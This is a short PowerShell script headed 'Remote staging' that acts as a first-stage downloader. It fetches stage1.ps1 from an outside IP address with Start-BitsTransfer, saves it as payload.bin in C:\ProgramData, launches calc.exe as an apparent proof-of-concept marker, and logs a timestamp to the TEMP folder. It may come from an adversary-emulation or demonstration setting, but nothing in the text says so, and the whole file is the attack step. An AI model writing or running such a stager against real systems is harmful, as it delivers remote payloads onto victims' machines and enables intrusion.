# Remote staging
$FetchUrl = 'http://203.0.113.203/stage1.ps1'
$Stage2Path = "C:\ProgramData\payload.bin"
Start-BitsTransfer -Source $FetchUrl -Destination $Stage2Path
& "calc.exe"
Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
